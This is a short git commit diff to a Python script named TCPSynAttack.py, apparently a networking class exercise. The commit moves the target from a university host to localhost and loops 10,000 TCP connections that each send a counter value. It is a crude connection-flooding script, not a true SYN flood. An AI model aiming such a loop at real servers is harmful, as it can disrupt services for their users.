2c677c71e278783aee47e29901eab14616b6a7fa
SuHwan Kim <tnghks9735@gmail.com>
2024-07-03 09:39:40 +0900

    Update TCPSynAttack.py

--- TCPSynAttack.py
+++ TCPSynAttack.py
@@ -1,10 +1,18 @@
 from socket import *
+import time
 
-serverName = "uni.skku.edu"
-serverPort = 12000
+serverName = "127.0.0.1"
+serverPort = 10090
 
 for i in range(10000):
     clientSocket = socket(AF_INET, SOCK_STREAM)
-    clientSocket.connect((serverName,serverPort))
+    try:
+        time.sleep(0.01)
+        clientSocket.connect((serverName,serverPort))
+        data = str(i)
+        message = bytes(data, 'utf-8')
+        clientSocket.send(message)
+    except Exception as e:
+        print(str(i) + "th send Error!", e)
     clientSocket.close()
 
